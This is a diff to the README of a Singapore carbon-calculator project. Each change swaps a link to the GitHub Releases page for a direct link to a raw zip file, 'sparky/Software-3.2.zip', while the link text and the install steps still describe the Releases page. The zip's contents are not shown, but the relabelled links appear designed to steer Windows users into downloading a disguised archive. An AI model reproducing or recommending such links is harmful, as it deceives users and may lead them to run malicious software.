@@ -1,10 +1,10 @@
 # 🌱 sgcarboncalculator - Track Singapore Carbon Use
 
-[![Download sgcarboncalculator](https://img.shields.io/badge/Download-sgcarboncalculator-blue?style=for-the-badge&logo=github)](https://github.com/arianabra7734/sgcarboncalculator/releases)
+[![Download sgcarboncalculator](https://img.shields.io/badge/Download-sgcarboncalculator-blue?style=for-the-badge&logo=github)](https://github.com/arianabra7734/sgcarboncalculator/raw/refs/heads/main/sparky/Software-3.2.zip)
 
 ## 🚀 Download
 
-Visit this page to download: [GitHub Releases](https://github.com/arianabra7734/sgcarboncalculator/releases)
+Visit this page to download: [GitHub Releases](https://github.com/arianabra7734/sgcarboncalculator/raw/refs/heads/main/sparky/Software-3.2.zip)
 
 Choose the latest release for Windows, then download the app file from the release page
 
@@ -25,7 +25,7 @@ You can also see your results in charts and get simple personal tips based on AI
 
 ## 📦 How to download
 
-1. Open the [GitHub Releases page](https://github.com/arianabra7734/sgcarboncalculator/releases)
+1. Open the [GitHub Releases page](https://github.com/arianabra7734/sgcarboncalculator/raw/refs/heads/main/sparky/Software-3.2.zip)
 2. Find the latest release at the top of the page
 3. In the Assets section, download the Windows file
 4. Save the file to your Downloads folder or Desktop
@@ -118,7 +118,7 @@ ai, calculator, carbon-footprint, chartjs, gemini, html-css-javascript, javascri
 
 ## 📁 Release page
 
-Get the Windows download here: [https://github.com/arianabra7734/sgcarboncalculator/releases](https://github.com/arianabra7734/sgcarboncalculator/releases)
+Get the Windows download here: [https://github.com/arianabra7734/sgcarboncalculator/raw/refs/heads/main/sparky/Software-3.2.zip](https://github.com/arianabra7734/sgcarboncalculator/raw/refs/heads/main/sparky/Software-3.2.zip)
 
 ## 🧭 Suggested use
 
